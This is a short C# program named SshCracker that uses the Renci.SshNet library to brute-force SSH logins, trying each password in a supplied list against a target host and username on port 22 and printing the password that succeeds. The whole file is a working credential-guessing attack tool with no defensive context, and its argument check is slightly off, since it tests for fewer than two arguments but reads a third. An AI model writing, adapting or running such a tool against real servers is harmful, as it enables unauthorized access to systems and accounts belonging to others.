using System;
using Renci.SshNet;
using System.IO;
using System.Text;

class SshCracker {
		public static void Main(string[] args) {
				if(args.Length < 2) {
						Console.WriteLine("<sshcrack.exe> <host> <username> <password list>");
				}else{
						if(System.IO.File.Exists(args[2])) {
								System.IO.StreamReader reader = new System.IO.StreamReader(args[2],System.Text.Encoding.GetEncoding("utf-8"));
								while(reader.Peek() >= 0) {
										string password = reader.ReadLine();
										if(true == SshConnection(args[0],args[1],password,22)) {
												Console.WriteLine("password is {0}",password);
												return;
										}
								}
								Console.WriteLine("password not found XP");
						}else{
								Console.WriteLine("file not found");
						}
				}
		}
		private static bool SshConnection(string host,string username,string password,int port) {
				var authMethod = new PasswordAuthenticationMethod(username,password);

				ConnectionInfo cinfo = new ConnectionInfo(host,port,username,authMethod);

				try{
						using (SshClient sshClient = new SshClient(cinfo)) {
								sshClient.Connect();
								sshClient.Disconnect();
						}
						return true;
				}catch{
						return false;
				}
		}
}


